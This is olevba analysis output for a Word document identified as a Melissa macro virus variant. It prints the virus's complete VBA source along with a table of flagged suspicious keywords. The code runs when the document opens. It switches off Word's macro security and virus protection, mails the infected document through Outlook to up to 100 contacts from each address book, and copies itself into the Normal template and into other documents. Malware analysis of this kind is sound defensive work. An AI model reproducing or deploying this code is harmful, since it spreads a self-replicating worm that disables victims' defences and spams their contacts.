olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.o-71cbcd19d1e44665696cfc4fbbb2ab613c9a6a0c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO x.cls 
in file: Virus.MSWord.Melissa.o-71cbcd19d1e44665696cfc4fbbb2ab613c9a6a0c - OLE stream: 'Macros/VBA/x'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
a$ = ""
hk1$ = "HKEY_CURRENT_USER"
sec1$ = "Security"
smo$ = "\Software\Microsoft\Office"
b$ = hk1$ + smo$ + "\9.0\Word\" + sec1$
c$ = "Level"
d$ = sec1$ + "..."
e$ = "Macro"
g$ = "Tools"
ot1$ = "Outlook"
h$ = ot1$ + ".Application"
k$ = hk1$ + smo$ + "\"
nam$ = "x"
i$ = nam$ + "?"
aut$ = "y"
J$ = "MAPI"
l$ = "profile"
m$ = "password"
n$ = "Duhalde Presidente "
o$ = "Programa de gobierno 1999 - 2004."
p$ = hk1$ + smo$ + "\"
q$ = "Private Sub Document_Close()"
r$ = "Private Sub Document_Open()"
s$ = "Document"
t$ = " "
On Error Resume Next
If System.PrivateProfileString(a$, b$, c$) <> a$ Then
CommandBars(e$).Controls(d$).Enabled = False
System.PrivateProfileString(a$, b$, c$) = 1&
Else
CommandBars(g$).Controls(e$).Enabled = False
Options.ConfirmConversions = (3 - 3): Options.VirusProtection = (3 - 3): Options.SaveNormalPrompt = (3 - 3)
End If
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject(h$)
Set DasMapiName = UngaDasOutlook.GetNameSpace(J$)
If System.PrivateProfileString(a$, k$, i$) <> aut$ Then
If UngaDasOutlook = ot1$ Then
DasMapiName.Logon l$, m$
    For Y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(Y)
        x1 = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x1)
            BreakUmOffASlice.Recipients.Add Peep
            x1 = x1 + 1
            If x1 > 100 Then oo = AddyBook.AddressEntries.Count
         Next oo
         BreakUmOffASlice.Subject = n$ & Application.UserName
         BreakUmOffASlice.Body = o$
         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
         BreakUmOffASlice.Send
         Peep = a$
    Next Y
DasMapiName.Logoff
End If
System.PrivateProfileString(a$, p$, i$) = aut$
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.codemodule.CountOfLines
ADCL = ADI1.codemodule.CountOfLines
BGN = 2
If ADI1.Name <> nam$ Then
If ADCL > 0 Then _
ADI1.codemodule.deletelines 1, ADCL
Set ToI = ADI1
ADI1.Name = nam$
DoAD = True
End If
If NTI1.Name <> nam$ Then
If NTCL > 0 Then _
NTI1.codemodule.deletelines 1, NTCL
Set ToI = NTI1
NTI1.Name = nam$
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.codemodule.Lines(1, 1) = a$
ADI1.codemodule.deletelines 1
Loop
ToI.codemodule.AddFromString (q$)
Do While ADI1.codemodule.Lines(BGN, 1) <> a$
ToI.codemodule.InsertLines BGN, ADI1.codemodule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.codemodule.Lines(1, 1) = a$
NTI1.codemodule.deletelines 1
Loop
ToI.codemodule.AddFromString (r$)
Do While NTI1.codemodule.Lines(BGN, 1) <> a$
ToI.codemodule.InsertLines BGN, NTI1.codemodule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, s$) = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, s$) <> False) Then
ActiveDocument.Saved = True: End If
If (Day(Now) + 1) = (Minute(Now) + 2) Then Selection.TypeText t$
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

